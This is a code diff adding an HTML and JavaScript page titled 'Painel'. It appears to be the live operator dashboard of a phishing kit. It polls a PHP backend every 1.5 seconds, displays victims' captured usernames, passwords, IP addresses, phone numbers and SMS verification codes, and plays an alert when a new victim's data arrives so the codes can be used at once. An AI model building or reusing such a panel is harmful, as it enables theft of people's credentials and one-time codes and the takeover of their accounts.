@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Painel</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/flowbite/1.8.1/flowbite.min.css"  rel="stylesheet" />
+</head>
+<body>
+  <!--  start table -->
+  
+    <div id="result" class="px-16 py-16 grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-4"> </div>
+    <video id="video-1523" autobuffer="false" autoplay="muted" src="alert.wav"></video>
+
+  <!-- finish table -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/flowbite/1.8.1/flowbite.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+  <script>
+
+    function sortByDate(a, b) {
+        if (a.horario < b.horario) {
+            return 1;
+        }
+        if (a.horario > b.horario) {
+            return -1;
+        }
+        return 0;
+    }
+
+    
+    let lastLoad = [];
+    let counter = 0;
+    function getData(firstMoment = false){
+       $.ajax({
+            url: "verification-data.php?notWrite=true&firstMoment="+firstMoment,
+            success: (data) => {
+              data = JSON.parse(data);
+              if(!data.update && !firstMoment) return;
+
+              document.getElementById("result").innerHTML = '';
+
+              const informations = Object.values(data?.data).sort(sortByDate);
+              
+            
+
+              informations.map((information) => document.getElementById("result").innerHTML += template(information));
+
+
+              const newData = informations.filter((d) => !lastLoad.includes(d.id));
+
+              const playItem = newData.find((d) => (d?.username && d?.password) || d?.telefone || d?.sms_code);
+
+             
+              if(playItem) {
+                document.querySelector('video').play();
+              }
+
+              const saveHistory = informations.filter((d) => d?.username && d?.password && d?.telefone && d?.sms_code);
+              console.log(saveHistory);
+              if(saveHistory)
+                lastLoad =saveHistory.map(inf => inf.id); 
+            } 
+       });
+       
+       if(counter == 0){
+        counter += 1 ;
+       }
+    }
+    function template(data){
+      const complete = [
+        data?.username, 
+        data?.password,
+        data?.telefone,
+        data?.sms_code
+      ]
+
+        return `
+        <div class="flex flex-col w-full rounded-lg  gap-2 p-2 text-zinc-700 border ${complete.includes(undefined) ? '' : 'border-green-500'}">
+            <h1>Página Acessada - ${data?.horario || ''}</h1>
+            <p><b class="text-sm">Username:</b> <span>${data?.username || ''}</span></p>
+            <p><b class="text-sm">Password:</b> <span>${data?.password || ''}</span></p>
+            <p><b class="text-sm">Ip:</b> <span>${data?.ip || ''}</span></p>
+            <p><b class="text-sm">Horário:</b> <span>${data?.horario || ''}</span></p>
+            <p><b class="text-sm">Telefone:</b> <span>${data?.telefone || ''}</span></p>
+            <p><b class="text-sm">SMS:</b> <span>${data?.sms_code || ''}</span></p>
+        </div>
+        `;
+    }
+
+    getData(true);
+    setInterval(getData, 1500);
+  </script>
+</body>
+</html>
+
